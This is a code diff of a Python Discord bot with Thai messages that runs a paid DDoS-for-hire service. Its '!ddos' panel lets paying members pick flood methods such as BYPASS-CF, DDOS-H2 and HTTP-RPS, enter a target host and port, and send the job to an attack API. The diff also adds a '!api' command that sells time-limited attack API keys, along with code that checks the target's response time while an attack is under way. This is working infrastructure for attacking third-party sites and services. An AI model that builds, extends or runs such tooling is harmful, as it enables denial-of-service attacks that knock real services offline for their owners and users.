@@ -1,10 +1,5 @@
 # bot.py
-import asyncio
-import ipaddress
-import os
-import signal
-import time
-import traceback
+import asyncio, ipaddress, os, signal, time, traceback
 from urllib.parse import urlparse
 
 import aiohttp
@@ -13,71 +8,47 @@ from discord.ext import commands
 
 from config import (
     BOT_TOKEN, PREFIX, OWNER_ID, MAX_DURATION, DATA_DIR,
-    API_BASE, API_KEY, FORBIDDEN_TLDS, FORBIDDEN_IPS,
+    API_BASE_LOCAL, PUBLIC_BASE, FORBIDDEN_TLDS, FORBIDDEN_IPS,
 )
 from database import Database
 
-# ═══════════════════════════════════════════
-# เลือก UI ตามบริบท (prefix command vs interaction)
-# ═══════════════════════════════════════════
-import ui_v2 as ui_v2
-import ui_legacy as ui_legacy
+_HAS_V2 = (hasattr(discord, "MessageFlags") and
+           hasattr(discord.MessageFlags, "components_v2") and
+           hasattr(discord.ui, "LayoutView") and
+           hasattr(discord.ui, "Container") and
+           hasattr(discord.ui, "TextDisplay"))
 
-# ตรวจสอบว่า discord.py รองรับ V2 หรือไม่
-_HAS_V2 = (
-    hasattr(discord, "MessageFlags")
-    and hasattr(discord.MessageFlags, "components_v2")
-    and hasattr(discord.ui, "LayoutView")
-    and hasattr(discord.ui, "Container")
-    and hasattr(discord.ui, "TextDisplay")
-)
+if _HAS_V2:
+    from ui_v2 import (build_panel, AttackModal, build_category_view,
+                       build_method_view, build_running, build_finished)
+    _UI_MODE = "v2"
+else:
+    from ui_legacy import (build_panel, AttackModal, build_category_view,
+                           build_method_view, build_running, build_finished)
+    _UI_MODE = "legacy"
 
-def _panel_kwargs():
-    """kwargs สำหรับ !ddos (prefix command) — ใช้ embed"""
-    return ui_legacy.build_panel()
-
-def _cat_kwargs(uid, target, port, dur):
-    """kwargs สำหรับ interaction — ใช้ V2 ถ้ามี"""
-    if _HAS_V2:
-        return ui_v2.build_category_view(uid, target, port, dur)
-    return ui_legacy.build_category_view(uid, target, port, dur)
-
-def _method_kwargs(cat, uid, target, port, dur):
-    if _HAS_V2:
-        return ui_v2.build_method_view(cat, uid, target, port, dur)
-    return ui_legacy.build_method_view(cat, uid, target, port, dur)
-
-def _running_kwargs(method, target, port, left, total, speed, hits=0):
-    if _HAS_V2:
-        return ui_v2.build_running(method, target, port, left, total, speed, hits)
-    return ui_legacy.build_running(method, target, port, left, total, speed, hits)
-
-# ═══════════════════════════════════════════
 intents = discord.Intents.default()
 intents.message_content = True
 intents.members = True
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 db = Database()
-active_attacks: dict[int, dict] = {}
+active_attacks = {}
 
-# ═══════════════════════════════════════════
-def _extract_host(target: str) -> str:
-    t = target.strip().lower()
-    if "://" in t:
-        return urlparse(t).hostname or ""
+
+def _extract_host(t):
+    t = t.strip().lower()
+    if "://" in t: return urlparse(t).hostname or ""
     if t.startswith("["):
         e = t.find("]")
-        if e > 0:
-            return t[1:e]
+        if e > 0: return t[1:e]
     return t.split("/")[0].split(":")[0]
 
-def is_forbidden(target: str) -> bool:
+
+def is_forbidden(target):
     host = _extract_host(target)
-    if not host:
-        return False
-    if any(host == tld.lstrip(".") or host.endswith(tld)
-           for tld in FORBIDDEN_TLDS):
+    if not host: return False
+    if any(host == tld.lstrip(".") or host.endswith(tld) for tld in FORBIDDEN_TLDS):
         return True
     try:
         ip = ipaddress.ip_address(host)
@@ -87,286 +58,236 @@ def is_forbidden(target: str) -> bool:
         pass
     return host in FORBIDDEN_IPS
 
-def _parse_duration(s: str):
+
+def _parse_dur(s):
     s = s.strip()
-    if s.upper() == "TH":
-        return 0
-    if len(s) < 2:
-        return None
-    try:
-        n = int(s[:-1])
-    except ValueError:
-        return None
+    if s.upper() == "TH": return 0
+    if len(s) < 2: return None
+    try: n = int(s[:-1])
+    except ValueError: return None
     u = s[-1].lower()
-    if u == "m":
-        return n * 60
-    if u == "h":
-        return n * 3600
-    if u == "d":
-        return n * 86400
+    if u == "m": return n * 60
+    if u == "h": return n * 3600
+    if u == "d": return n * 86400
     return None
 
-# ═══════════════════════════════════════════
+
 @bot.event
 async def on_ready():
     os.makedirs(DATA_DIR, exist_ok=True)
     await db.init()
-    print(f"[VANTA] logged in as {bot.user}")
-    print(f"[VANTA] discord.py = {discord.__version__}")
-    print(f"[VANTA] Components V2 = {'yes' if _HAS_V2 else 'NO — fallback to embed'}")
+    print(f"[BOT] logged in as {bot.user}")
+    print(f"[BOT] discord.py = {discord.__version__}")
+    print(f"[BOT] UI = {_UI_MODE}")
+
 
 @bot.event
 async def on_command_error(ctx, error):
-    if isinstance(error, commands.CommandNotFound):
-        return
+    if isinstance(error, commands.CommandNotFound): return
     if isinstance(error, commands.MemberNotFound):
-        await ctx.send("หา member ไม่เจอ")
-        return
+        await ctx.send("หา member ไม่เจอ"); return
     if isinstance(error, commands.MissingRequiredArgument):
-        await ctx.send(f"ใช้: `!{ctx.command.name} {error.param.name}`")
-        return
+        await ctx.send(f"ใช้: `!{ctx.command.name} {error.param.name}`"); return
     print(f"[err] {error}")
     traceback.print_exception(type(error), error, error.__traceback__)
 
-# ═══════════════════════════════════════════
+
 @bot.command(name="ddos", aliases=["panel"])
 async def ddos_cmd(ctx):
+    if ctx.author.id != OWNER_ID:
+        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูง รั่วว")
+        return
     try:
-        await ctx.send(**_panel_kwargs())
+        await ctx.send(**build_panel())
     except Exception as e:
         traceback.print_exc()
         await ctx.send(f"error: {e}")
 
+
+@bot.command(name="api")
+async def api_cmd(ctx, duration: str = "1d"):
+    if ctx.author.id != OWNER_ID:
+        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูง รั่วว")
+        return
+    secs = _parse_dur(duration)
+    if secs is None:
+        await ctx.send("รูปแบบ: 1h / 1d / 1-7d")
+        return
+    if secs == 0:
+        secs = 7 * 86400
+    if secs > 7 * 86400:
+        await ctx.send("สูงสุด 7 วัน")
+        return
+    key = await db.create_key(ctx.author.id, secs, forever=False)
+    expires = int(time.time()) + secs
+    await ctx.send(
+        f"API สร้างแล้ว:\n"
+        f"`{PUBLIC_BASE}/attack?key={key}&target=<TARGET>&port=<PORT>&duration=<SEC>&method=<METHOD>`\n"
+        f"หมดอายุ: <t:{expires}:R>"
+    )
+
+
 @bot.command(name="vi")
 async def vi_cmd(ctx, member: discord.Member = None, duration: str = "TH"):
     if ctx.author.id != OWNER_ID:
-        await ctx.send("ชั้นต่ำจะมาใช้คำสั่งชั้นสูง รั่วว")
+        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูง รั่วว")
         return
     if member is None:
-        await ctx.send("ใช้: `!vi @user 1h` (TH = ถาวร)")
-        return
-    secs = _parse_duration(duration)
+        await ctx.send("ใช้: `!vi @user 1h` (TH = ถาวร)"); return
+    secs = _parse_dur(duration)
     if secs is None:
-        await ctx.send("รูปแบบ: 1m / 1h / 1d / TH")
-        return
+        await ctx.send("รูปแบบ: 1h / 1d / TH"); return
     forever = secs == 0
     await db.add_virus(member.id, secs, forever)
-    await ctx.send(
-        f"ให้ไวรัส **{member.mention}** "
-        f"({'ถาวร' if forever else duration})"
-    )
+    await ctx.send(f"ให้ยศ **{member.mention}** ({'ถาวร' if forever else duration})")
+
 
 @bot.command(name="unvi")
 async def unvi_cmd(ctx, member: discord.Member = None):
     if ctx.author.id != OWNER_ID:
-        await ctx.send("ชั้นต่ำจะมาใช้คำสั่งชั้นสูง รั่วว")
-        return
+        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูง รั่วว"); return
     if member is None:
-        await ctx.send("ใช้: `!unvi @user`")
-        return
+        await ctx.send("ใช้: `!unvi @user`"); return
     await db.remove_virus(member.id)
-    await ctx.send(f"ปลดไวรัส **{member.mention}** แล้ว")
+    await ctx.send(f"ปลดยศ **{member.mention}** แล้ว")
 
-# ═══════════════════════════════════════════
-# Flow
-# ═══════════════════════════════════════════
+
+# ── flow ──
 async def open_attack_modal(interaction):
     uid = interaction.user.id
-    try:
-        has = await db.has_virus(uid)
-    except Exception as e:
-        await interaction.response.send_message(f"DB error: {e}", ephemeral=True)
-        return
-    if not has:
+    if uid != OWNER_ID and not await db.has_virus(uid):
         await interaction.response.send_message(
-            "มาซื้อไวรัสมาาาา แค่วันละ 40 เอง ถาวร 300", ephemeral=True)
-        return
-    if uid in active_attacks:
-        await interaction.response.send_message(
-            "รอของเก่าหมดก่อน", ephemeral=True)
-        return
-    await interaction.response.send_modal(ui_v2.AttackModal() if _HAS_V2 else ui_legacy.AttackModal())
-
-async def handle_attack_submit(interaction, modal):
-    uid = interaction.user.id
-    try:
-        has = await db.has_virus(uid)
-    except Exception as e:
-        await interaction.response.send_message(f"DB error: {e}", ephemeral=True)
-        return
-
-    if not has:
-        await interaction.response.send_message("มาซื้อไวรัสมาาาา", ephemeral=True)
+            "มาซื้อยศมา วันละ35 มีApi ขายด้วย วันละ20 เชื่อมบอทได้", ephemeral=True)
         return
     if uid in active_attacks:
         await interaction.response.send_message("รอของเก่าหมดก่อน", ephemeral=True)
         return
+    await interaction.response.send_modal(AttackModal())
+
+
+async def handle_attack_submit(interaction, modal):
+    uid = interaction.user.id
+    if uid != OWNER_ID and not await db.has_virus(uid):
+        await interaction.response.send_message("มาซื้อยศมา", ephemeral=True); return
+    if uid in active_attacks:
+        await interaction.response.send_message("รอของเก่าหมดก่อน", ephemeral=True); return
 
     target = modal.target.value.strip()
     try:
         port = int(modal.port.value)
         dur = min(int(modal.duration.value), MAX_DURATION)
     except ValueError:
-        await interaction.response.send_message("ใส่ตัวเลขให้ถูกต้อง", ephemeral=True)
-        return
-
+        await interaction.response.send_message("ใส่ตัวเลขให้ถูกต้อง", ephemeral=True); return
     if port < 1 or port > 65535 or dur < 1:
-        await interaction.response.send_message("ค่าไม่ถูกต้อง", ephemeral=True)
-        return
+        await interaction.response.send_message("ค่าไม่ถูกต้อง", ephemeral=True); return
 
     if is_forbidden(target):
-        await interaction.response.send_message("ห้ามยิงไอ้ควายอ่านกฎด้วย", ephemeral=True)
-        return
+        await interaction.response.send_message("อย่าหลอนอ่านกฎด้วย", ephemeral=True); return
 
     try:
-        await interaction.response.send_message(
-            ephemeral=True,
-            **_cat_kwargs(uid, target, port, dur),
-        )
-    except Exception as e:
-        traceback.print_exc()
-        try:
-            await interaction.followup.send(f"error: {e}", ephemeral=True)
-        except Exception:
-            pass
-
-async def show_method_panel(interaction, cat, target, port, dur):
-    uid = interaction.user.id
-    try:
-        await interaction.response.edit_message(
-            **_method_kwargs(cat, uid, target, port, dur))
+        await interaction.response.send_message(ephemeral=True,
+            **build_category_view(uid, target, port, dur))
     except Exception:
         traceback.print_exc()
+
+
+async def show_method_panel(interaction, cat, target, port, dur):
+    try:
+        await interaction.response.edit_message(
+            **build_method_view(cat, interaction.user.id, target, port, dur))
+    except Exception:
+        traceback.print_exc()
+
 
 async def fire_attack(interaction, method, target, port, dur):
     uid = interaction.user.id
-
     try:
         await interaction.response.edit_message(
-            **_running_kwargs(method, target, port, dur, dur, "..."))
+            **build_running(method, target, port, dur, dur, "..."))
     except Exception:
-        traceback.print_exc()
-        return
+        traceback.print_exc(); return
+    msg = await interaction.original_response()
 
-    try:
-        msg = await interaction.original_response()
-    except Exception:
-        msg = None
-
-    url = f"{API_BASE}/attack?key={API_KEY}"
+    key = await db.ensure_owner_key()
+    url = f"{API_BASE_LOCAL}/attack?key={key}"
     payload = {"method": method, "target": target, "port": port, "duration": dur}
-
     try:
         async with aiohttp.ClientSession() as s:
-            async with s.post(url, json=payload,
-                              timeout=aiohttp.ClientTimeout(total=30)) as r:
+            async with s.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=30)) as r:
                 data = await r.json()
     except Exception as e:
-        if msg:
-            await _safe_edit(msg, _running_kwargs(method, target, port, 0, dur, f"error: {e}"))
-        return
-
+        await _safe(msg, build_running(method, target, port, 0, dur, f"err: {e}")); return
     if not data.get("success"):
-        detail = data.get("detail", "fail")
-        if msg:
-            await _safe_edit(msg, _running_kwargs(method, target, port, 0, dur, f"API: {detail}"))
-        return
+        await _safe(msg, build_running(method, target, port, 0, dur, f"API: {data.get('detail','fail')}")); return
 
-    try:
-        await db.log_attack(uid, target, port, method, dur)
-    except Exception:
-        pass
-
-    state = {
-        "job_id": data.get("job_id"),
-        "msg": msg,
-        "start": time.time(),
-    }
+    await db.log_attack(uid, target, port, method, dur)
+    state = {"job_id": data.get("job_id"), "msg": msg, "start": time.time()}
     active_attacks[uid] = state
-    asyncio.create_task(_tick(uid, state, method, target, port, dur))
+    asyncio.create_task(_tick(uid, state, method, target, port, dur, key))
 
-async def _safe_edit(msg, kwargs):
-    if not msg:
-        return
-    try:
-        await msg.edit(**kwargs)
-        return
-    except Exception:
-        pass
-    if "view" in kwargs:
-        try:
-            await msg.edit(view=kwargs["view"])
-        except Exception:
-            pass
 
-async def _fetch_stats(job_id):
+async def _safe(msg, kwargs):
+    if not msg: return
+    try: await msg.edit(**kwargs)
+    except: pass
+
+
+async def _fetch_stats(jid, key):
     try:
         async with aiohttp.ClientSession() as s:
-            url = f"{API_BASE}/status?key={API_KEY}&job_id={job_id}"
-            async with s.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
+            async with s.get(f"{API_BASE_LOCAL}/status?key={key}&job_id={jid}",
+                             timeout=aiohttp.ClientTimeout(total=5)) as r:
                 return await r.json()
     except Exception:
         return {}
 
-async def _tick(uid, state, method, target, port, dur):
-    msg = state.get("msg")
-    job_id = state.get("job_id")
-    st = state["start"]
 
+async def _tick(uid, state, method, target, port, dur, key):
+    msg = state["msg"]; jid = state["job_id"]; st = state["start"]
     while time.time() - st < dur:
         await asyncio.sleep(1)
         left = max(0, int(dur - (time.time() - st)))
+        info = await _fetch_stats(jid, key) if jid else {}
+        hits = info.get("hits", 0)
+        elapsed = max(1, info.get("elapsed", 1))
+        speed = f"{hits//elapsed}/s"
+        # measure target speed for web
+        if method in ("GET","POST","HTTPS","HTTPSLOAD","BYPASS-CF","BYPASS-CDN","DDOS-H2","TLS","HTTP-RPS"):
+            try:
+                s0 = time.time()
+                async with aiohttp.ClientSession() as s:
+                    u = target if target.startswith("http") else f"https://{target}:{port}"
+                    async with s.get(u, timeout=aiohttp.ClientTimeout(total=3)) as r:
+                        await r.read()
+                speed = f"{int((time.time()-s0)*1000)}ms"
+            except Exception:
+                speed = "offline"
+        await _safe(msg, build_running(method, target, port, left, dur, speed, hits))
 
-        hits = 0
-        speed_text = "running"
-
-        if job_id:
-            info = await _fetch_stats(job_id)
-            if info and not info.get("exists", True):
-                break
-            hits = info.get("hits", 0)
-            elapsed = max(1, info.get("elapsed", 1))
-            rate = hits // elapsed
-            speed_text = f"{rate}/s"
-
-        await _safe_edit(msg, _running_kwargs(
-            method, target, port, left, dur, speed_text, hits))
-
-    if job_id:
+    if jid:
         try:
             async with aiohttp.ClientSession() as s:
-                await s.post(
-                    f"{API_BASE}/stop?key={API_KEY}",
-                    json={"job_id": job_id},
-                    timeout=aiohttp.ClientTimeout(total=5))
-        except Exception:
-            pass
-
+                await s.post(f"{API_BASE_LOCAL}/stop?key={key}", json={"job_id": jid},
+                             timeout=aiohttp.ClientTimeout(total=5))
+        except Exception: pass
     active_attacks.pop(uid, None)
+    final = await _fetch_stats(jid, key) if jid else {}
+    await _safe(msg, build_finished(method, target, port, dur, final.get("hits", 0)))
 
-    final_hits = 0
-    if job_id:
-        info = await _fetch_stats(job_id)
-        final_hits = info.get("hits", 0)
 
-    await _safe_edit(msg, _running_kwargs(
-        method, target, port, 0, dur, "finished", final_hits))
-
-# ═══════════════════════════════════════════
 def _shutdown(sig, frame):
-    print(f"\n[VANTA] signal {sig} — shutting down")
     raise SystemExit(0)
+
 
 def _install_signals():
     try:
         signal.signal(signal.SIGINT, _shutdown)
         signal.signal(signal.SIGTERM, _shutdown)
-    except ValueError:
-        pass
+    except ValueError: pass
+
 
 if __name__ == "__main__":
-    if not BOT_TOKEN:
-        raise SystemExit("❌ BOT_TOKEN ไม่ได้ตั้ง")
+    if not BOT_TOKEN: raise SystemExit("❌ BOT_TOKEN ไม่ได้ตั้ง")
     os.makedirs(DATA_DIR, exist_ok=True)
     _install_signals()
     bot.run(BOT_TOKEN)
